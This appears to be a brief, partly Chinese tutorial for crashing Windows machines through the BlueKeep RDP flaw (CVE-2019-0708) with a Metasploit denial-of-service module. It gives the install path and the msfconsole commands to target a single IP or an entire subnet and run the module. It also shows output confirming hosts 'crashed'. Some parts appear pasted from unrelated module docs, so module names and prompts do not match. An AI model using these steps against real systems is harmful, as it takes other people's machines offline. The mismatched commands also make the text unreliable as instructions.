# CVE-2019-0708

这是个针对2019-0708漏洞的蓝屏教程（大雾
https://github.com/mekhalleh/cve-2019-0708
## Verification Steps

  1. Install the module as usual (`~/.msf4/modules/auxiliary/dos/rdp/`)
  2. Start msfconsole
  3. Do: `use auxiliary/dos/rdp`
  4. Do: `set hostname 192.168.1.1`
  5. Do: `set verbose true`
  6. Do: `run`

代码为 
```
use exploit/jojo/cve_2019_0708_bluekeep_dos 

info

set rhosts 192.168.100.86(目标IP)

set verbose true 

run
```

  **RDP_CLIENT_IP**

  The client IPv4 address to report during connection. Default: 192.168.0.1

  **RDP_CLIENT_NAME**

  The client computer name to report during connection. Default: rdesktop, Unset: Randomized

  **RDP_DOMAIN**

  The client domain name to report during connect

  **RDP_USER**

  The username to report during connection. Default: Randomized

  **RHOSTS**

  Target address, address range or CIDR identifier.

    msf auxiliary(gather/behind_cloudflare) > set rhosts 192.168.1.14
    --or--
    msf auxiliary(gather/behind_cloudflare) > set rhosts 192.168.1.17-89
    --or--
    msf auxiliary(gather/behind_cloudflare) > set rhosts 192.168.1.0/24

  **RPORT**

  The target TCP port on which the RDP protocol response. Default: 3389


  **THREADS**

  The number of concurrent threads. Default: 1

  **VERBOSE**

  You can also enable the verbose mode to have more information displayed in the console.

  ## Scenarios

  ### For auditing purpose

  If successful, you must be able to obtain following status:
  ```
msf5 auxiliary(dos/rdp/cve_2019_0708_bluekeep_dos) > run

[+] 172.20.2.31:3389 - The host is crashed!
[*] 172.20.2.31:3389 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(dos/rdp/cve_2019_0708_bluekeep_dos) > run

[*] 172.20.2.25-35:3389 - Scanned  2 of 11 hosts (18% complete)
[*] 172.20.2.25-35:3389 - Scanned 10 of 11 hosts (90% complete)
[+] 172.20.2.31:3389 - The host is crashed!
[*] 172.20.2.25-35:3389 - Scanned 11 of 11 hosts (100% complete)
[*] Auxiliary module execution completed
  ```

















